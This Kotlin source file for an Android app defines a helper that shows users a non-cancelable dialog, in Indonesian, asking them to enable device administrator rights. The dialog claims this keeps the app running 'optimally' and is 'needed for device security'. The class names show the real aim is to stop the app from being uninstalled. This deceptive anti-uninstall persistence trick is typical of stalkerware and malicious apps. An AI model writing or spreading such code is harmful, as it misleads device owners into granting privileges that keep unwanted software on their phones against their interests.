package com.sync.xxx

import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent

object AntiUninstallHelper {

    private const val PREF_NAME = "anti_uninstall_prefs"
    private const val KEY_ADMIN_REQUESTED = "admin_requested"

    fun requestAdminIfNeeded(context: Context) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)

        // Kalau admin sudah aktif, skip
        if (dpm.isAdminActive(admin)) return

        // Tampilkan dialog
        AlertDialog.Builder(context)
            .setTitle("Aktifkan Admin")
            .setMessage("Aktifkan izin administrator perangkat agar aplikasi berjalan optimal dan tidak terganggu.")
            .setCancelable(false)
            .setPositiveButton("Aktifkan") { _, _ ->
                // Set flag setelah user klik tombol
                val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                prefs.edit().putBoolean(KEY_ADMIN_REQUESTED, true).apply()
                
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Diperlukan untuk keamanan perangkat.")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            }
            .setNegativeButton("Nanti") { dialog, _ ->
                dialog.dismiss()
            }
            .show()
    }

    fun isAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)
        return dpm.isAdminActive(admin)
    }
    
    // Reset flag kalau mau request ulang
    fun resetAdminRequest(context: Context) {
        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_ADMIN_REQUESTED, false).apply()
    }
}
